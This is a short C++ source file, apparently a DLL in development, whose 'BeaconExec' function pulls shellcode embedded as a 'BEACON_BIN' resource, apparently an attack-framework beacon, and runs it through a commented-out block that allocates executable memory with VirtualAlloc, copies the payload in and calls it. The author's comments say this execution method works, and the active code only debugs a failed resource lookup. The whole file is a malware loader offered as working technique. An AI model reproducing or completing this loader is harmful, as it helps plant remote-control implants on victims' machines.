#include "pch.h"
#include "resource.h"
#include <iostream>
#include <Windows.h>



DWORD WINAPI BeaconExec(__in PVOID lpParameter) {
	// IDR_BEACON_BIN1 - is the resource ID which contains ths shellcode
	// BEACON_BIN is the resource type name set earlier when embedding the beacon.bin



	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_BEACON_BIN1), L"BEACON_BIN");

	// TODO: move resource location, test ShellCodeExec with below null check

	// My shitty method of figuring out that the shellcodeResource var is NULL
	// so essentially the FindResource() function is returning NULL
	if (shellcodeResource == NULL) {
		system("msg * kekw ur ass");
	}

	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource); // Will be NULL bc shellcodeResource is NULL
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource); // Will be NULL bc shellcodeResource is NULL
	/*
	// This shit below works, standard mem allocation and execution
	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();
	*/

	return  0;
}